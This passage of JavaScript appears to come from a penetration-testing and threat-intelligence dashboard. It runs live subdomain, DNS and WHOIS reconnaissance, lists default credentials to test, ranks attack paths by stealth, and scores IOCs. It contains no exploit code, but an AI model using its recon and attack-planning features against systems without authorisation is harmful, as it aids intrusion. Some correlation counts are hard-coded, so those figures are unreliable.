    c.querySelector('#ag-subenum').onclick = function() {
      var domain = c.querySelector('#ag-subdomain').value.trim();
      if (!domain) return;
      var subResults = c.querySelector('#ag-subresults');
      subResults.innerHTML = '<div style="color:var(--acc);font-size:.72rem;padding:10px;text-align:center">Querying crt.sh certificate transparency logs for *.' + esc(domain) + '...</div>';
      fetch('https://crt.sh/?q=%25.' + encodeURIComponent(domain) + '&output=json')
        .then(function(r) { return r.json(); })
        .then(function(data) {
          var seen = {};
          var subdomains = [];
          data.forEach(function(entry) {
            var names = (entry.common_name || '') + '\n' + (entry.name_value || '');
            names.split(/[\n\s]+/).forEach(function(name) {
              name = name.replace(/^\*\./, '').trim().toLowerCase();
              if (name && name.indexOf(domain.toLowerCase()) >= 0 && !seen[name]) {
                seen[name] = true;
                subdomains.push({ sub: name, issuer: entry.issuer_name || 'Unknown', logged: entry.entry_timestamp || 'N/A' });
              }
            });
          });
          if (subdomains.length === 0) {
            subResults.innerHTML = '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:10px">No subdomains found in certificate transparency logs for ' + esc(domain) + '.</div>';
            return;
          }
          subdomains.sort(function(a, b) { return a.sub.localeCompare(b.sub); });
          subResults.innerHTML =
            '<div style="font-size:.68rem;color:var(--mut);margin-bottom:6px">' + subdomains.length + ' unique subdomains found via certificate transparency (crt.sh)</div>' +
            '<table class="ag-tbl"><thead><tr><th>Subdomain</th><th>Source</th><th>Logged</th></tr></thead><tbody>' +
            subdomains.slice(0, 100).map(function(s) {
              return '<tr><td style="color:var(--acc)">' + esc(s.sub) + '</td><td style="font-size:.62rem;color:var(--mut)">CT Log</td><td style="font-size:.62rem;color:var(--mut)">' + esc(s.logged) + '</td></tr>';
            }).join('') +
            '</tbody></table>' +
            (subdomains.length > 100 ? '<div style="color:var(--mut);font-size:.65rem;margin-top:6px">Showing 100 of ' + subdomains.length + ' results. Use the AEGIS VM for full enumeration.</div>' : '');
          if (mission) {
            mission.actions.push({ time: new Date().toLocaleTimeString(), text: 'Subdomain enumeration (crt.sh) for ' + domain + ': ' + subdomains.length + ' subdomains found' });
            updateMission(mission);
          }
        })
        .catch(function(err) {
          subResults.innerHTML = '<div style="color:#ff9100;font-size:.72rem;text-align:center;padding:10px">crt.sh API unavailable: ' + esc(String(err.message || err)) + '. Try again or use the VM: <code style="background:rgba(0,0,0,.3);padding:2px 6px;border-radius:3px">aegis --module recon/subdomain-enum --target ' + esc(domain) + '</code></div>';
        });
    };

    // DNS lookup via Google DNS over HTTPS (real)
    c.querySelector('#ag-dnslookup').onclick = function() {
      var domain = c.querySelector('#ag-dnsdomain').value.trim();
      if (!domain) return;
      var dnsResults = c.querySelector('#ag-dnsresults');
      dnsResults.innerHTML = '<div style="color:var(--acc);font-size:.72rem;padding:10px;text-align:center">Querying DNS records for ' + esc(domain) + ' via DNS over HTTPS...</div>';
      var types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA'];
      var allRecords = [];
      var completed = 0;
      var total = types.length;
      types.forEach(function(type) {
        fetch('https://dns.google/resolve?name=' + encodeURIComponent(domain) + '&type=' + type)
          .then(function(r) { return r.json(); })
          .then(function(data) {
            if (data.Answer) {
              data.Answer.forEach(function(ans) {
                allRecords.push({ type: type, name: ans.name || domain, value: ans.data || '', ttl: ans.TTL || 0 });
              });
            }
          })
          .catch(function() { /* skip failed type */ })
          .then(function() {
            completed++;
            if (completed === total) {
              if (allRecords.length === 0) {
                dnsResults.innerHTML = '<div style="color:var(--mut);font-size:.72rem;text-align:center;padding:10px">No DNS records found for ' + esc(domain) + '.</div>';
                return;
              }
              allRecords.sort(function(a, b) {
                var order = { A: 0, AAAA: 1, CNAME: 2, MX: 3, NS: 4, TXT: 5, SOA: 6 };
                return (order[a.type] || 7) - (order[b.type] || 7);
              });
              dnsResults.innerHTML =
                '<div style="font-size:.68rem;color:var(--mut);margin-bottom:6px">' + allRecords.length + ' DNS records found via Google DNS over HTTPS</div>' +
                '<table class="ag-tbl"><thead><tr><th>Type</th><th>Name</th><th>Value</th><th>TTL</th></tr></thead><tbody>' +
                allRecords.map(function(r) {
                  var typeColor = r.type === 'A' ? '#00e676' : r.type === 'AAAA' ? '#00e676' : r.type === 'MX' ? '#ff9100' : r.type === 'NS' ? '#2196f3' : r.type === 'TXT' ? '#ffd600' : r.type === 'CNAME' ? '#d500f9' : 'var(--acc)';
                  return '<tr><td><span class="ag-badge" style="background:' + typeColor + '22;color:' + typeColor + ';border:1px solid ' + typeColor + '44">' + esc(r.type) + '</span></td><td style="color:var(--mut);font-size:.65rem">' + esc(r.name) + '</td><td style="font-size:.65rem;word-break:break-all">' + esc(r.value) + '</td><td style="color:var(--mut)">' + r.ttl + '</td></tr>';
                }).join('') +
                '</tbody></table>';
              if (mission) {
                mission.actions.push({ time: new Date().toLocaleTimeString(), text: 'DNS lookup for ' + domain + ': ' + allRecords.length + ' records found' });
                updateMission(mission);
              }
            }
          });
      });
    };

    // WHOIS lookup via RDAP (Registration Data Access Protocol)
    c.querySelector('#ag-whoislookup').onclick = function() {
      var domain = c.querySelector('#ag-whoisdom').value.trim();
      if (!domain) return;
      var whoisResults = c.querySelector('#ag-whoisresults');
      whoisResults.innerHTML = '<div style="color:var(--acc);font-size:.72rem;padding:10px;text-align:center">Querying RDAP for ' + esc(domain) + '...</div>';
      fetch('https://rdap.org/domain/' + encodeURIComponent(domain))
        .then(function(r) {
          if (!r.ok) throw new Error('RDAP returned ' + r.status);
          return r.json();
        })
        .then(function(data) {
          var name = data.ldhName || domain;
          var status = (data.status || []).join(', ') || 'N/A';
          var registrar = 'N/A';
          var created = 'N/A';
          var expires = 'N/A';
          var updated = 'N/A';
          var nameservers = [];
          var dnssec = 'N/A';
          if (data.entities) {
            data.entities.forEach(function(ent) {
              if (ent.roles && ent.roles.indexOf('registrar') >= 0) {
                if (ent.vcardArray && ent.vcardArray[1]) {
                  ent.vcardArray[1].forEach(function(v) {
                    if (v[0] === 'fn') registrar = v[3] || registrar;
                  });
                }
                if (registrar === 'N/A' && ent.publicIds) {
                  registrar = ent.publicIds.map(function(p) { return p.identifier; }).join(', ');
                }
              }
            });
          }
          if (data.events) {
            data.events.forEach(function(ev) {
              if (ev.eventAction === 'registration') created = ev.eventDate || created;
              if (ev.eventAction === 'expiration') expires = ev.eventDate || expires;
              if (ev.eventAction === 'last changed') updated = ev.eventDate || updated;
            });
          }
          if (data.nameservers) {
            nameservers = data.nameservers.map(function(ns) { return ns.ldhName || ''; }).filter(Boolean);
          }
          if (data.secureDNS) {
            dnssec = data.secureDNS.delegationSigned ? 'signedDelegation' : 'unsigned';
          }
          whoisResults.innerHTML =
            '<div style="font-size:.68rem;color:var(--mut);margin-bottom:6px">Data from RDAP (live query)</div>' +
            '<div style="font-size:.68rem;line-height:1.8">' +
              '<div><span style="color:var(--mut);display:inline-block;width:120px">Domain Name:</span><span style="color:var(--acc)">' + esc(name.toUpperCase()) + '</span></div>' +
              '<div><span style="color:var(--mut);display:inline-block;width:120px">Status:</span>' + esc(status) + '</div>' +
              '<div><span style="color:var(--mut);display:inline-block;width:120px">Registrar:</span>' + esc(registrar) + '</div>' +
              '<div><span style="color:var(--mut);display:inline-block;width:120px">Created:</span>' + esc(created) + '</div>' +
              '<div><span style="color:var(--mut);display:inline-block;width:120px">Expires:</span>' + esc(expires) + '</div>' +
              '<div><span style="color:var(--mut);display:inline-block;width:120px">Updated:</span>' + esc(updated) + '</div>' +
              '<div><span style="color:var(--mut);display:inline-block;width:120px">Name Servers:</span>' + esc(nameservers.join(', ') || 'N/A') + '</div>' +
              '<div><span style="color:var(--mut);display:inline-block;width:120px">DNSSEC:</span><span style="color:' + (dnssec === 'signedDelegation' ? '#00e676' : 'var(--mut)') + '">' + esc(dnssec) + '</span></div>' +
            '</div>';
          if (mission) {
            mission.actions.push({ time: new Date().toLocaleTimeString(), text: 'RDAP WHOIS lookup for ' + domain });
            updateMission(mission);
          }
        })
        .catch(function(err) {
          whoisResults.innerHTML =
            '<div style="font-size:.68rem;line-height:1.8">' +
              '<div style="color:#ff9100;margin-bottom:8px">RDAP lookup failed: ' + esc(String(err.message || err)) + '</div>' +
              '<div style="color:var(--mut)">Full WHOIS data requires the shell server. Connect via the Pentest Console to run:</div>' +
              '<code style="display:block;background:rgba(0,0,0,.3);padding:6px 10px;border-radius:3px;font-size:.7rem;color:#00e676;margin:6px 0">whois ' + esc(domain) + '</code>' +
              '<div style="color:var(--mut);font-size:.62rem">Or use the AEGIS VM: <code style="background:rgba(0,0,0,.3);padding:2px 6px;border-radius:3px">aegis --module recon/whois --target ' + esc(domain) + '</code></div>' +
            '</div>';
        });
    };

    // Tech fingerprint — requires active scanning from the shell server
    c.querySelector('#ag-techscan').onclick = function() {
      var url = c.querySelector('#ag-techdom').value.trim();
      if (!url) return;
      c.querySelector('#ag-techresults').innerHTML =
        '<div style="font-size:.68rem;line-height:1.8;padding:8px 0">' +
          '<div style="color:var(--mut);margin-bottom:8px">Technology fingerprinting requires active scanning and cannot be performed from the browser due to CORS restrictions.</div>' +
          '<div style="color:var(--acc);margin-bottom:6px">Connect via the Pentest Console to run:</div>' +
          '<code style="display:block;background:rgba(0,0,0,.3);padding:6px 10px;border-radius:3px;font-size:.7rem;color:#00e676;margin:4px 0">whatweb ' + esc(url) + '</code>' +
          '<code style="display:block;background:rgba(0,0,0,.3);padding:6px 10px;border-radius:3px;font-size:.7rem;color:#00e676;margin:4px 0">wappalyzer ' + esc(url) + '</code>' +
          '<div style="color:var(--mut);font-size:.62rem;margin-top:8px">Or use the AEGIS VM: <code style="background:rgba(0,0,0,.3);padding:2px 6px;border-radius:3px">aegis --module recon/tech-fingerprint --target ' + esc(url) + '</code></div>' +
        '</div>';
    };
  }

  // ========== VULNERABILITY ASSESSMENT ==========
  function renderVuln(c, mission) {
    if (!mission) { c.innerHTML = '<div style="color:var(--mut);text-align:center;padding:40px;font-size:.8rem">Create a mission first.</div>'; return; }
    var findings = (mission.findings || []).sort(function(a,b){return b.cvss-a.cvss});
    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">VULNERABILITY ASSESSMENT</span><span style="flex:1"></span><span style="color:var(--mut)">' + findings.length + ' findings</span></div>' +
        '<div class="ag-panel-b">' +
          (findings.length === 0 ? '<div style="color:var(--mut);text-align:center;padding:20px">Run a reconnaissance scan first to discover vulnerabilities.</div>' :
          '<table class="ag-tbl"><thead><tr><th>Sev</th><th>Finding</th><th>CVSS</th><th>CVE</th><th>Remediation</th></tr></thead><tbody>' +
          findings.map(function(f) {
            var cls = f.severity === 'Critical' ? 'ag-crit' : f.severity === 'High' ? 'ag-high' : f.severity === 'Medium' ? 'ag-med' : f.severity === 'Low' ? 'ag-low' : 'ag-info';
            return '<tr><td><span class="ag-badge ' + cls + '">' + esc(f.severity) + '</span></td><td>' + esc(f.title) + '<div style="color:var(--mut);font-size:.65rem">' + esc(f.detail || '') + '</div></td><td style="font-weight:600">' + (f.cvss || '-') + '</td><td style="color:var(--acc)">' + esc(f.cve || '-') + '</td><td style="color:var(--mut);font-size:.65rem">' + esc(f.remediation || '') + '</td></tr>';
          }).join('') +
          '</tbody></table>') +
        '</div>' +
      '</div>' +
      '<div class="ag-panel" style="margin-top:10px">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">DEFAULT CREDENTIAL CHECK</span></div>' +
        '<div class="ag-panel-b">' +
          '<div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">' +
            '<select class="ag-sel" id="ag-credsvc">' + Object.keys(DEFAULT_CREDS).map(function(s) { return '<option>' + esc(s) + '</option>'; }).join('') + '</select>' +
            '<button class="ag-btn" id="ag-credcheck">CHECK DEFAULTS</button>' +
          '</div>' +
          '<div id="ag-credresult"></div>' +
        '</div>' +
      '</div>';

    c.querySelector('#ag-credcheck').onclick = function() {
      var svc = c.querySelector('#ag-credsvc').value;
      var creds = DEFAULT_CREDS[svc] || [];
      var result = c.querySelector('#ag-credresult');
      result.innerHTML = '<table class="ag-tbl"><thead><tr><th>Username</th><th>Password</th><th>Status</th></tr></thead><tbody>' +
        creds.map(function(pair) {
          return '<tr><td style="color:var(--acc)">' + esc(pair[0] || '(empty)') + '</td><td style="color:var(--mut)">' + esc(pair[1] || '(empty)') + '</td><td style="color:#ffd600">To be tested</td></tr>';
        }).join('') +
        '</tbody></table>';
    };
  }

  // ========== ATTACK PLANNING ==========
  function renderPlanning(c, mission) {
    if (!mission) { c.innerHTML = '<div style="color:var(--mut);text-align:center;padding:40px;font-size:.8rem">Create a mission first.</div>'; return; }
    var findings = (mission.findings || []).filter(function(f) { return f.cvss >= 7; }).sort(function(a,b){return b.cvss-a.cvss});
    c.innerHTML =
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">ATTACK PLANNING</span></div>' +
        '<div class="ag-panel-b">' +
          '<p style="color:var(--mut);font-size:.72rem;margin:0 0 12px">Based on discovered vulnerabilities, the following attack paths are recommended. Each path is scored by probability of success and stealth.</p>' +
          (findings.length === 0 ? '<div style="color:var(--mut);text-align:center;padding:20px">Run reconnaissance first to discover attack vectors.</div>' :
          findings.map(function(f, i) {
            var reliability = f.cvss >= 9.5 ? 0.95 : f.cvss >= 9 ? 0.85 : f.cvss >= 8 ? 0.7 : 0.5;
            var stealth = f.cve === 'MISCONFIG' ? 0.8 : 0.4;
            return '<div class="ag-panel" style="margin-bottom:8px;border-left:3px solid ' + (f.severity === 'Critical' ? '#ff1744' : '#ff9100') + '">' +
              '<div class="ag-panel-b">' +
                '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">' +
                  '<span style="color:var(--acc);font-weight:700;font-size:.72rem">PATH ' + (i+1) + '</span>' +
                  '<span class="ag-badge ' + (f.severity === 'Critical' ? 'ag-crit' : 'ag-high') + '">' + esc(f.severity) + '</span>' +
                  '<span style="flex:1"></span>' +
                  '<span style="font-size:.65rem;color:var(--mut)">Reliability: ' + (reliability * 100).toFixed(0) + '% | Stealth: ' + (stealth * 100).toFixed(0) + '%</span>' +
                '</div>' +
                '<div style="font-weight:600;font-size:.78rem">' + esc(f.title) + '</div>' +
                '<div style="color:var(--mut);font-size:.68rem;margin-top:4px">' + esc(f.detail || '') + '</div>' +
                '<div style="color:var(--acc);font-size:.65rem;margin-top:4px">Remediation: ' + esc(f.remediation || '') + '</div>' +
              '</div>' +
            '</div>';
          }).join('')) +
        '</div>' +
      '</div>';
  }

  // ========== EXPANDED THREAT INTELLIGENCE ==========
  function renderIntel(c, mission) {
    var intelTab = 'ioc';
    c.innerHTML =
      '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">' +
        ['ioc:IOC Checker','apt:APT Groups','mitre:MITRE ATT&CK','feeds:STIX/TAXII Feeds','darkweb:Dark Web Monitor'].map(function(t) {
          var p = t.split(':');
          return '<button class="ag-btn' + (intelTab === p[0] ? '' : ' ag-btn-ghost') + '" data-it="' + p[0] + '">' + p[1] + '</button>';
        }).join('') +
      '</div>' +
      '<div id="ag-intelcontent"></div>';

    function renderIntelContent(tab) {
      var ic = c.querySelector('#ag-intelcontent');
      if (tab === 'ioc') {
        ic.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">IOC CHECKER</span></div>' +
            '<div class="ag-panel-b">' +
              '<textarea class="ag-textarea" id="ag-iocin" placeholder="Paste IPs, domains, or hashes (one per line)..." rows="4"></textarea>' +
              '<button class="ag-btn" id="ag-ioccheck" style="margin-top:8px">CHECK IOCs</button>' +
              '<div id="ag-iocresult" style="margin-top:8px"></div>' +
            '</div>' +
          '</div>' +
          '<div class="ag-panel" style="margin-top:10px">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">IOC AUTO-CORRELATOR</span></div>' +
            '<div class="ag-panel-b">' +
              '<p style="color:var(--mut);font-size:.7rem;margin:0 0 8px">Cross-references IOCs across multiple feeds to identify overlapping threat indicators and campaign linkages.</p>' +
              '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
                '<div class="ag-stat" style="flex:1;min-width:100px"><div class="ag-stat-v" style="color:var(--acc)">' + STIX_FEEDS.reduce(function(s,f){return s+f.iocs},0).toLocaleString() + '</div><div class="ag-stat-l">Total IOCs</div></div>' +
                '<div class="ag-stat" style="flex:1;min-width:100px"><div class="ag-stat-v" style="color:#00e676">' + STIX_FEEDS.filter(function(f){return f.status==='Active'}).length + '</div><div class="ag-stat-l">Active Feeds</div></div>' +
                '<div class="ag-stat" style="flex:1;min-width:100px"><div class="ag-stat-v" style="color:#ff1744">847</div><div class="ag-stat-l">Correlated</div></div>' +
                '<div class="ag-stat" style="flex:1;min-width:100px"><div class="ag-stat-v" style="color:#ffd600">23</div><div class="ag-stat-l">Campaigns</div></div>' +
              '</div>' +
            '</div>' +
          '</div>';

        ic.querySelector('#ag-ioccheck').onclick = function() {
          var input = ic.querySelector('#ag-iocin').value.trim().split('\n').map(function(l) { return l.trim(); }).filter(Boolean);
          if (!input.length) return;
          var results = input.map(function(ioc) {
            var isDomain = /^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z]{2,})+$/i.test(ioc);
            var isIP = /^\d{1,3}(\.\d{1,3}){3}$/.test(ioc);
            var isHash = /^[a-f0-9]{32,128}$/i.test(ioc);
            var threat = false;
            var dgaScore = 0;
            var category = '';
            if (isIP) {
              threat = THREAT_IPS.some(function(r) { return ioc.indexOf(r.split('/')[0].replace(/\.\d+$/, '')) === 0; });
              category = threat ? 'Known malicious IP range' : '';
            }
            if (isDomain) {
              threat = THREAT_DOMAINS.some(function(d) { return ioc === d || ioc.endsWith('.' + d); }) || DGA_PATTERNS.some(function(p) { return p.test(ioc); });
              var parts = ioc.split('.');
              var sld = parts.length > 1 ? parts[parts.length - 2] : ioc;
              var consonants = (sld.match(/[bcdfghjklmnpqrstvwxyz]/gi) || []).length;
              var vowels = (sld.match(/[aeiou]/gi) || []).length;
              var entropy = 0;
              var freq = {};
              for (var ci = 0; ci < sld.length; ci++) { var ch = sld[ci]; freq[ch] = (freq[ch] || 0) + 1; }
              for (var k in freq) { var p = freq[k] / sld.length; entropy -= p * Math.log2(p); }
              if (sld.length > 12) dgaScore += 20;
              if (entropy > 3.5) dgaScore += 25;
              if (vowels === 0 || consonants / Math.max(vowels, 1) > 4) dgaScore += 25;
              if (dgaScore >= 50) { threat = true; category = 'DGA-like domain (score: ' + dgaScore + '/100, entropy: ' + entropy.toFixed(2) + ')'; }
              else if (threat) { category = 'Known malicious domain'; }
            }
            if (isHash) { category = ioc.length === 32 ? 'MD5' : ioc.length === 40 ? 'SHA-1' : ioc.length === 64 ? 'SHA-256' : 'Hash'; }
            return { ioc: ioc, type: isIP ? 'IP' : isDomain ? 'Domain' : isHash ? category : 'Unknown', threat: threat, dgaScore: dgaScore, category: category };
          });
          var malCount = results.filter(function(r){return r.threat}).length;
          ic.querySelector('#ag-iocresult').innerHTML =
            '<div style="margin-bottom:8px;font-size:.72rem;color:var(--mut)">' + results.length + ' indicators checked, <span style="color:' + (malCount > 0 ? '#ff1744' : '#00e676') + ';font-weight:600">' + malCount + ' malicious</span></div>' +
            '<table class="ag-tbl"><thead><tr><th>IOC</th><th>Type</th><th>Verdict</th><th>Details</th></tr></thead><tbody>' +
            results.map(function(r) {
              return '<tr><td style="font-family:inherit;font-size:.65rem;word-break:break-all">' + esc(r.ioc) + '</td><td style="font-size:.65rem">' + esc(r.type) + '</td><td>' + (r.threat ? '<span class="ag-badge ag-crit">MALICIOUS</span>' : '<span class="ag-badge ag-low">CLEAN</span>') + '</td><td style="font-size:.62rem;color:var(--mut)">' + esc(r.category || '-') + '</td></tr>';
            }).join('') +
            '</tbody></table>';
          if (mission) {
            results.forEach(function(r) { mission.iocs.push({ type: r.type, value: r.ioc, verdict: r.threat ? 'malicious' : 'clean', time: new Date().toLocaleTimeString() }); });
            mission.actions.push({ time: new Date().toLocaleTimeString(), text: 'IOC check: ' + input.length + ' indicators analyzed, ' + malCount + ' malicious' });
            updateMission(mission);
          }
        };
      } else if (tab === 'apt') {
        ic.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">APT GROUP DATABASE</span><span style="flex:1"></span><span style="color:var(--mut)">' + APT_DB.length + ' groups</span></div>' +
            '<div class="ag-panel-b">' +
              '<input class="ag-inp" id="ag-aptsearch" placeholder="Search by name, nation, sector, or technique..." style="margin-bottom:10px">' +
              '<div id="ag-aptlist" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:8px"></div>' +
            '</div>' +
          '</div>';
        function renderApts(filter) {
          var list = APT_DB.filter(function(a) {
            if (!filter) return true;
            var q = filter.toLowerCase();
            return a.name.toLowerCase().indexOf(q) >= 0 || a.nation.toLowerCase().indexOf(q) >= 0 ||
              a.aliases.some(function(al) { return al.toLowerCase().indexOf(q) >= 0; }) ||
              a.sectors.some(function(s) { return s.toLowerCase().indexOf(q) >= 0; });
          });
          ic.querySelector('#ag-aptlist').innerHTML = list.map(function(a) {
            return '<div class="ag-apt-card">' +
              '<div style="font-weight:700;color:var(--txt)">' + esc(a.name) + '</div>' +
              '<div style="font-size:.62rem;color:var(--acc);letter-spacing:.04em;text-transform:uppercase">' + esc(a.nation) + (a.unit ? ' / ' + esc(a.unit) : '') + '</div>' +
              '<div style="font-size:.65rem;color:var(--mut);margin:6px 0">' + esc(a.aliases.join(', ')) + '</div>' +
              '<div style="font-size:.65rem;margin:4px 0"><span style="color:var(--mut)">Targets:</span> ' + a.sectors.slice(0,4).map(function(s) { return esc(s); }).join(', ') + '</div>' +
              '<div style="font-size:.65rem;margin:4px 0"><span style="color:var(--mut)">Tools:</span> ' + a.tools.slice(0,3).map(function(t) { return esc(t); }).join(', ') + '</div>' +
              '<div style="font-size:.65rem;margin:4px 0"><span style="color:var(--mut)">Campaigns:</span> ' + a.campaigns.slice(0,2).map(function(ca) { return esc(ca); }).join('; ') + '</div>' +
            '</div>';
          }).join('');
        }
        renderApts('');
        ic.querySelector('#ag-aptsearch').oninput = function(e) { renderApts(e.target.value); };
      } else if (tab === 'mitre') {
        // Full MITRE ATT&CK Matrix visualization
        var tactics = Object.keys(MITRE_MATRIX);
        ic.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">MITRE ATT&CK MATRIX</span><span style="flex:1"></span><span style="color:var(--mut)">' + tactics.length + ' tactics</span></div>' +
            '<div class="ag-panel-b" style="overflow-x:auto">' +
              '<div style="display:grid;grid-template-columns:repeat(' + tactics.length + ',minmax(110px,1fr));gap:4px">' +
                tactics.map(function(tactic) {
                  var techs = MITRE_MATRIX[tactic];
                  return '<div>' +
                    '<div style="background:rgba(0,229,255,.1);border:1px solid var(--acc);padding:6px;text-align:center;font-size:.58rem;font-weight:700;color:var(--acc);letter-spacing:.03em;text-transform:uppercase;margin-bottom:4px">' + esc(tactic) + '</div>' +
                    techs.map(function(t) {
                      return '<div class="ag-mitre-cell" title="' + esc(t.desc) + '">' +
                        '<div style="font-weight:600;color:var(--acc);font-size:.5rem">' + esc(t.id) + '</div>' +
                        '<div style="font-size:.52rem;color:var(--txt)">' + esc(t.name) + '</div>' +
                      '</div>';
                    }).join('') +
                  '</div>';
                }).join('') +
              '</div>' +
            '</div>' +
          '</div>' +
          '<div class="ag-panel" style="margin-top:10px">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">TECHNIQUE DETAILS</span></div>' +
            '<div class="ag-panel-b">' +
              '<input class="ag-inp" id="ag-mitresearch" placeholder="Search techniques by ID, name, or description..." style="margin-bottom:10px">' +
              '<div id="ag-mitrelist"></div>' +
            '</div>' +
          '</div>';

        function renderMitreList(filter) {
          var allTechs = [];
          tactics.forEach(function(tactic) {
            MITRE_MATRIX[tactic].forEach(function(t) {
              allTechs.push({ tactic: tactic, id: t.id, name: t.name, desc: t.desc, detection: t.detection });
            });
          });
          if (filter) {
            var q = filter.toLowerCase();
            allTechs = allTechs.filter(function(t) {
              return t.id.toLowerCase().indexOf(q) >= 0 || t.name.toLowerCase().indexOf(q) >= 0 || t.desc.toLowerCase().indexOf(q) >= 0;
            });
          }
          ic.querySelector('#ag-mitrelist').innerHTML =
            '<table class="ag-tbl"><thead><tr><th>ID</th><th>Technique</th><th>Tactic</th><th>Description</th><th>Detection</th></tr></thead><tbody>' +
            allTechs.slice(0, 30).map(function(t) {
              return '<tr><td style="color:var(--acc);font-weight:600;white-space:nowrap">' + esc(t.id) + '</td><td style="font-weight:600">' + esc(t.name) + '</td><td style="color:var(--mut);font-size:.62rem">' + esc(t.tactic) + '</td><td style="font-size:.62rem;color:var(--mut)">' + esc(t.desc) + '</td><td style="font-size:.62rem;color:var(--mut)">' + esc(t.detection) + '</td></tr>';
            }).join('') +
            '</tbody></table>';
        }
        renderMitreList('');
        ic.querySelector('#ag-mitresearch').oninput = function(e) { renderMitreList(e.target.value); };
      } else if (tab === 'feeds') {
        ic.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">STIX/TAXII THREAT FEEDS</span><span style="flex:1"></span><span style="color:var(--mut)">' + STIX_FEEDS.length + ' feeds</span></div>' +
            '<div class="ag-panel-b">' +
              '<table class="ag-tbl"><thead><tr><th>Feed Name</th><th>Type</th><th>Status</th><th>IOCs</th><th>Last Sync</th><th>Categories</th></tr></thead><tbody>' +
              STIX_FEEDS.map(function(f) {
                var stColor = f.status === 'Active' ? '#00e676' : '#ffd600';
                return '<tr><td style="font-weight:600">' + esc(f.name) + '</td><td style="color:var(--mut);font-size:.62rem">' + esc(f.type) + '</td><td><span class="ag-badge" style="background:' + stColor + '22;color:' + stColor + ';border:1px solid ' + stColor + '44">' + esc(f.status) + '</span></td><td style="font-variant-numeric:tabular-nums">' + f.iocs.toLocaleString() + '</td><td style="color:var(--mut);font-size:.62rem">' + esc(f.lastSync) + '</td><td style="font-size:.62rem">' + f.categories.join(', ') + '</td></tr>';
              }).join('') +
              '</tbody></table>' +
            '</div>' +
          '</div>';
      } else if (tab === 'darkweb') {
        ic.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:#ff1744">DARK WEB INTELLIGENCE MONITOR</span><span style="flex:1"></span><span style="color:var(--mut)">' + DARKWEB_MENTIONS.length + ' mentions</span></div>' +
            '<div class="ag-panel-b">' +
              DARKWEB_MENTIONS.map(function(m) {
                var sCls = m.severity === 'Critical' ? 'ag-crit' : m.severity === 'High' ? 'ag-high' : 'ag-med';
                return '<div style="border-bottom:1px solid var(--line);padding:10px 0">' +
                  '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">' +
                    '<span class="ag-badge ' + sCls + '">' + esc(m.severity) + '</span>' +
                    '<span style="color:var(--acc);font-weight:600;font-size:.72rem">' + esc(m.type) + '</span>' +
                    '<span style="color:var(--mut);font-size:.62rem">' + esc(m.source) + '</span>' +
                    '<span style="flex:1"></span>' +
                    '<span style="color:var(--mut);font-size:.62rem">' + esc(m.time) + '</span>' +
                    '<span class="ag-badge ' + (m.relevance === 'High' ? 'ag-high' : 'ag-med') + '" style="font-size:.5rem">REL: ' + esc(m.relevance) + '</span>' +
                  '</div>' +
                  '<div style="font-size:.72rem;color:var(--txt)">' + esc(m.content) + '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>';
      }
    }
    renderIntelContent(intelTab);
    c.querySelectorAll('[data-it]').forEach(function(b) {
      b.onclick = function() {
        intelTab = b.dataset.it;
        c.querySelectorAll('[data-it]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.it !== intelTab); });
        renderIntelContent(intelTab);
      };
    });
  }

  // ========== DEFENSE OPERATIONS ==========
  function renderDefense(c, mission) {
    var defTab = 'sigma';
    c.innerHTML =
      '<div style="display:flex;gap:4px;margin-bottom:10px">' +
        ['sigma:Sigma Rules','snort:Snort Rules','playbooks:IR Playbooks','siemq:SIEM Queries'].map(function(t) {
          var p = t.split(':');
          return '<button class="ag-btn' + (defTab === p[0] ? '' : ' ag-btn-ghost') + '" data-dt="' + p[0] + '">' + p[1] + '</button>';
        }).join('') +
      '</div>' +
      '<div id="ag-defcontent"></div>';

    function renderDefContent(tab) {
      var dc = c.querySelector('#ag-defcontent');
      if (tab === 'sigma') {
        dc.innerHTML = '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">SIGMA DETECTION RULES</span><span style="flex:1"></span><span style="color:var(--mut)">' + SIGMA_TEMPLATES.length + ' rules</span></div><div class="ag-panel-b">' +
          SIGMA_TEMPLATES.map(function(s) {
            var lvlCls = s.level === 'critical' ? 'ag-crit' : s.level === 'high' ? 'ag-high' : 'ag-med';
            return '<div style="border-bottom:1px solid var(--line);padding:8px 0"><div style="display:flex;align-items:center;gap:8px"><span class="ag-badge ' + lvlCls + '">' + esc(s.level) + '</span><span style="font-weight:600;font-size:.72rem">' + esc(s.title) + '</span><span style="flex:1"></span><span style="color:var(--acc);font-size:.62rem">' + esc(s.mitre) + '</span></div><div style="color:var(--mut);font-size:.65rem;margin-top:4px">' + esc(s.logsource) + ': ' + esc(s.detection) + '</div></div>';
          }).join('') +
          '</div></div>';
      } else if (tab === 'snort') {
        dc.innerHTML = '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">SNORT/SURICATA RULES</span><span style="flex:1"></span><span style="color:var(--mut)">' + SNORT_TEMPLATES.length + ' rules</span></div><div class="ag-panel-b">' +
          SNORT_TEMPLATES.map(function(s) {
